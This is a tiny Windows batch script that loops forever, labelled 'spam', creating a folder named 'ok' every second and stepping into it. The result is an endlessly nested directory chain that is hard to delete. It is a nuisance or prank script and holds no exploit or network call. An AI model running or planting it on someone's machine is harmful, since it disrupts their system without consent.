@echo off
set x=1
:spam
md ok
timeout 1 >nul
cd ok
goto spam
